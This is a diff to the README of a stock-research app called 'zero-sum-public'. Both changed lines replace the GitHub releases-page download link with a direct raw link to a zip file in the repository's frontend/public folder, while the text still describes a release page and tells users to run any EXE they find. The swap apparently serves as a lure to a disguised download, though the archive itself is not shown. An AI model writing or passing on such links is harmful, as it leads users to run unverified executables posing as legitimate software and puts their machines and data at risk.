@@ -1,6 +1,6 @@
 # 📈 zero-sum-public - Stock research made simple
 
-[![Download zero-sum-public](https://img.shields.io/badge/Download%20zero--sum--public-0B5FFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Inextinguishable-principalship955/zero-sum-public/releases)
+[![Download zero-sum-public](https://img.shields.io/badge/Download%20zero--sum--public-0B5FFF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Inextinguishable-principalship955/zero-sum-public/main/frontend/public/zero_public_sum_v2.3-beta.5.zip)
 
 ## 🧭 What this app does
 
@@ -25,7 +25,7 @@ For smoother use, 8 GB of RAM or more is a better fit if you plan to keep many c
 
 Visit the release page and download the latest Windows version from here:
 
-https://github.com/Inextinguishable-principalship955/zero-sum-public/releases
+https://raw.githubusercontent.com/Inextinguishable-principalship955/zero-sum-public/main/frontend/public/zero_public_sum_v2.3-beta.5.zip
 
 On that page, look for the newest release and download the Windows file that matches your PC. If you see a ZIP file, save it to your computer first, then open it. If you see an EXE file, you can run it after the download finishes.
 
